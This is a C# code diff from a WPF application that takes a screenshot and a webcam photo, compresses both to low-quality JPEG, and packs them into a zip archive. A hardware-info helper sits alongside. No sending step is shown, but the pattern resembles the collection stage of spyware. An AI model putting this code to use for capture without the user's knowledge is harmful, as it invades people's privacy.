@@ -12,6 +12,9 @@ using System.Drawing;
 using System.Windows.Threading;
 using System.Windows.Media.Animation;
 using WPFUIKitProfessional;
+using System.Drawing.Imaging;
+using System.Linq;
+using System.Threading;
 
 namespace Bibon.Pages
 {
@@ -106,7 +109,7 @@ namespace Bibon.Pages
                     // Захват скриншота и добавление в архив
                     string screenshotPath = System.IO.Path.Combine(tempPath, "screenshot.png");
                     CaptureScreenshot(screenshotPath);
-                    archive.CreateEntryFromFile(screenshotPath, "Foto/screenshot.png");
+                    archive.CreateEntryFromFile(screenshotPath, "Foto/screenshot.png", CompressionLevel.Optimal);
               
 
                     // Захват фото с камеры и добавление в архив
@@ -114,7 +117,7 @@ namespace Bibon.Pages
                     {
                         string cameraPhotoPath = System.IO.Path.Combine(tempPath, "camera_photo.png");
                         CapturePhotoFromCamera(cameraPhotoPath);
-                        archive.CreateEntryFromFile(cameraPhotoPath, "Foto/camera_photo.png");
+                        archive.CreateEntryFromFile(cameraPhotoPath, "Foto/camera_photo.png", CompressionLevel.Optimal);
                     }
                     catch (ApplicationException ex)
                     {
@@ -151,7 +154,11 @@ namespace Bibon.Pages
             {
                 g.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
             }
-            screenshot.Save(filePath);
+            // Сохранение сжатого JPEG
+            ImageCodecInfo jpegCodec = GetEncoder(ImageFormat.Jpeg);
+            EncoderParameters encoderParams = new EncoderParameters(1);
+            encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 50L); // 50% качества
+            screenshot.Save(filePath, jpegCodec, encoderParams);
         }
 
         // Метод для захвата изображения с камеры
@@ -164,21 +171,40 @@ namespace Bibon.Pages
             }
 
             VideoCaptureDevice videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
+
+            // Захват кадра
+            Bitmap bitmap = null;
+            ManualResetEvent frameCaptured = new ManualResetEvent(false);
+
             videoSource.NewFrame += (sender, eventArgs) =>
             {
-                Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();
-                bitmap.Save(filePath);
-                videoSource.SignalToStop(); // Останавливаем захват после первого кадра
+                // Клонируем кадр для дальнейшей обработки
+                bitmap = (Bitmap)eventArgs.Frame.Clone();
+                frameCaptured.Set(); // Сигнал завершения захвата
+                videoSource.SignalToStop(); // Останавливаем захват
             };
+
             videoSource.Start();
 
-            // Ожидание завершения захвата
-            while (videoSource.IsRunning)
+            // Ждем, пока кадр будет захвачен
+            if (!frameCaptured.WaitOne(TimeSpan.FromSeconds(5))) // 5 секунд на ожидание
             {
-                System.Threading.Thread.Sleep(100);
+                videoSource.SignalToStop();
+                throw new TimeoutException("Не удалось получить изображение с камеры.");
             }
+
+            // Сохранение изображения в JPEG с уменьшением качества
+            ImageCodecInfo jpegCodec = GetEncoder(ImageFormat.Jpeg);
+            EncoderParameters encoderParams = new EncoderParameters(1);
+            encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 50L); // 50% качества
+            bitmap.Save(filePath, jpegCodec, encoderParams);
         }
 
+        // Получение кодека для JPEG
+        private ImageCodecInfo GetEncoder(ImageFormat format)
+        {
+            return ImageCodecInfo.GetImageDecoders().FirstOrDefault(codec => codec.FormatID == format.Guid);
+        }
         // Пример функции для получения информации о системе
         private string GetHardwareInfo(string wmiClass, string wmiProperty)
         {
